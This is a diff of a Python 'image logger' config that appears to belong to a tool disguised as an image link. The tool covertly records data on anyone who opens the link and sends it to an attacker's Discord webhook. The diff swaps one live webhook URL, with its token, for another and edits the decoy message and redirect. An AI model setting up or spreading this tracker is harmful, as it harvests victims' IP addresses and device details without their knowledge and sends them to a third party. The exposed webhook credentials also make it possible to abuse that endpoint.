@@ -4,7 +4,7 @@ import traceback, requests, base64, httpagentparser
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1400568551978438778/Pj2V1f-x47tiYihTdHcUsoEEOqriE81ag50xoOVfEkeUGlasnq7qUq6WfcLEiunUNgZK",
+    "webhook": "https://discord.com/api/webhooks/1400735753234808906/58Kz9EL2ZYqUeVwxGyTa3ix6qkIR_f3zn46LBw5877u3hfMeIjshLclm3F1EimJACGUa",
     "image": "https://imgur.com/a/EyTSqWo", # You can also have a custom image by using a URL argument
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -19,7 +19,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message (or disable)
-        "message": "https://imgur.com/a/EyTSqWo", # Message to show
+        "message": "slayer_.2318632", # Message to show
         "richMessage": True, # Enable rich text?
     },
 
@@ -41,7 +41,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": False, # Redirect to a webpage?
-        "page": "https://imgur.com/a/EyTSqWo" # Link to the webpage to redirect to 
+        "page": "https://your-link.here" # Link to the webpage to redirect to 
     },
 }
 
@@ -279,4 +279,3 @@ if (!currenturl.includes("g=")) {
     do_POST = handleRequest
 
 handler = app = ImageLoggerAPI
-  
